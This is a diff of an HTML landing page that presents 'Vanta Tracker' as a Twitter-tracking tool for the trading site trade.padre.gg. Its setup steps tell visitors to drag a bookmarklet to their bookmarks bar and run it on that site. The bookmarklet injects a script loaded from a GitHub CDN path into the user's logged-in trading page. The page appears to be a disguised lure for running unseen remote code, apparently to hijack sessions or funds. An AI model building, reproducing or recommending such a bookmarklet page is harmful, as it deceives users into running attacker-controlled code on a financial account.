@@ -2,23 +2,165 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>VANTA TRACKER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
+    <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
+    
+    <meta property="og:title" content="Vanta Tracker - Premier Twitter Tracker for Padre">
+    <meta property="og:description" content="Advanced Twitter API tracking tools optimized for Padre workflows with real-time insights and WebGL-accelerated analytics.">
+    <meta property="og:image" content="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Vanta Tracker">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Vanta Tracker - Premier Twitter Tracker for Padre">
+    <meta name="twitter:description" content="Advanced Twitter API tracking tools optimized for Padre workflows with real-time insights and WebGL-accelerated analytics.">
+    <meta name="twitter:image" content="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg">
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        body { background: #050505; color: #00ff88; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .vanta-btn { border: 2px solid #00ff88; padding: 20px 40px; color: #00ff88; text-decoration: none; font-weight: bold; letter-spacing: 2px; transition: 0.3s; cursor: grab; }
-        .vanta-btn:hover { background: #00ff88; color: #000; box-shadow: 0 0 30px #00ff88; }
-        #canvas-bg { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; }
+        :root {
+            --primary: #00ff88;
+            --primary-dark: #00cc66;
+            --bg-dark: #0a0a0a;
+            --text-light: #e0e0e0;
+            --text-muted: #aaaaaa;
+            --border: rgba(0, 255, 136, 0.2);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-light);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.3; }
+        .warning {
+            background: linear-gradient(135deg, #003322, #004d33);
+            color: #ffffff;
+            text-align: center;
+            padding: 12px;
+            font-size: 0.95em;
+            font-weight: 600;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 1px solid var(--primary);
+        }
+        header {
+            background: linear-gradient(135deg, #000000, #001a0d);
+            text-align: center;
+            padding: 120px 20px;
+            border-bottom: 2px solid var(--primary);
+        }
+        .logo { width: 140px; margin: 0 auto 20px; filter: drop-shadow(0 0 15px rgba(0,255,136,0.5)); }
+        header h1 { font-size: 3.5em; color: var(--primary); text-shadow: 0 0 10px rgba(0,255,136,0.4); }
+        nav { background: #000; padding: 18px; text-align: center; position: sticky; top: 44px; z-index: 999; border-bottom: 1px solid var(--primary); }
+        nav a { color: var(--primary); margin: 0 30px; text-decoration: none; font-weight: 600; }
+        .hero { text-align: center; padding: 100px 20px; }
+        .cta-button {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: #000;
+            padding: 16px 36px;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: 700;
+            margin: 12px;
+            cursor: grab;
+            box-shadow: 0 6px 20px rgba(0,255,136,0.4);
+        }
+        .features { padding: 100px 20px; max-width: 1200px; margin: 0 auto; }
+        .feature-list { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
+        .feature-item { background: #111; padding: 30px; border-radius: 12px; border: 1px solid var(--border); text-align: center; }
+        .setup-section { padding: 80px 20px; text-align: center; }
+        ol { text-align: left; max-width: 600px; margin: 0 auto 30px; color: var(--text-muted); }
+        footer { padding: 40px; text-align: center; border-top: 1px solid var(--primary); color: #888; }
     </style>
 </head>
 <body>
-    <div id="canvas-bg"></div>
-    <h1>VANTA_NODE_EXTRACTOR</h1>
-    <p>Drag to bookmarks bar and activate on Padre</p>
+    <canvas id="filamentCanvas"></canvas>
+    <div class="warning">Warning: vanta-tracker.com is our only website</div>
     
-    <a href="javascript:(function(){var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/Vanta-Dev-Pages/Vanta@Vanta/engine.js?v='+Date.now();document.body.appendChild(s);})();" class="vanta-btn">VANTA TRACKER</a>
+    <header>
+        <svg class="logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M50 8 L78 25 L78 75 L50 92 L22 75 L22 25 Z" stroke="var(--primary)" stroke-width="3" fill="none"/>
+            <circle cx="50" cy="50" r="8" fill="var(--primary)" filter="drop-shadow(0 0 10px var(--primary))"/>
+        </svg>
+        <h1>Vanta Tracker</h1>
+        <p>Premier Twitter API tracking for Padre.</p>
+    </header>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.net.min.js"></script>
-    <script>VANTA.NET({el:"#canvas-bg",color:0x00ff88,backgroundColor:0x050505,points:15});</script>
+    <nav>
+        <a href="#features">Features</a>
+        <a href="#setup">Setup</a>
+    </nav>
+
+    <section class="hero">
+        <h2>Optimize Your Padre Workflow</h2>
+        <p>WebGL-accelerated analytics with ultra-low latency API polling.</p>
+        <a href="#setup" class="cta-button">Get Started</a>
+    </section>
+
+    <section id="features" class="features">
+        <div class="feature-list">
+            <div class="feature-item"><h3>Real-Time Polling</h3><p>Sub-second latency for Padre signals.</p></div>
+            <div class="feature-item"><h3>WebGL Engine</h3><p>60 FPS high-performance dashboard.</p></div>
+            <div class="feature-item"><h3>Secure Sync</h3><p>Encrypted Twitter-Padre data integration.</p></div>
+        </div>
+    </section>
+
+    <section id="setup" class="setup-section">
+        <h2>Setup Vanta Tracker</h2>
+        <ol>
+            <li>Enable your Bookmarks Bar (Ctrl+Shift+B).</li>
+            <li>Drag the button below to your bar.</li>
+            <li>Open <strong>trade.padre.gg</strong> and click the bookmark.</li>
+        </ol>
+        
+        <a href="javascript:(function(){var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/Vanta-Dev-Pages/Vanta@Vanta/engine.js?v='+Date.now();document.body.appendChild(s);})();" class="cta-button">
+            Vanta Tracker
+        </a>
+    </section>
+
+    <footer>
+        <p>© 2025 Vanta Tracker. All rights reserved.</p>
+    </footer>
+
+    <script>
+        const canvas = document.getElementById('filamentCanvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const filaments = [];
+        for (let i = 0; i < 25; i++) {
+            filaments.push({
+                x: Math.random() * canvas.width,
+                y: Math.random() * canvas.height,
+                len: 100 + Math.random() * 100,
+                angle: Math.random() * Math.PI * 2,
+                speed: 1 + Math.random()
+            });
+        }
+        function animate() {
+            ctx.fillStyle = 'rgba(10, 10, 10, 0.1)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            filaments.forEach(f => {
+                f.x += Math.cos(f.angle) * f.speed;
+                f.y += Math.sin(f.angle) * f.speed;
+                if (f.x < 0 || f.x > canvas.width) f.x = Math.random() * canvas.width;
+                if (f.y < 0 || f.y > canvas.height) f.y = Math.random() * canvas.height;
+                ctx.strokeStyle = '#00ff88';
+                ctx.lineWidth = 2;
+                ctx.beginPath();
+                ctx.moveTo(f.x, f.y);
+                ctx.lineTo(f.x + Math.cos(f.angle) * f.len, f.y + Math.sin(f.angle) * f.len);
+                ctx.stroke();
+            });
+            requestAnimationFrame(animate);
+        }
+        animate();
+    </script>
 </body>
 </html>
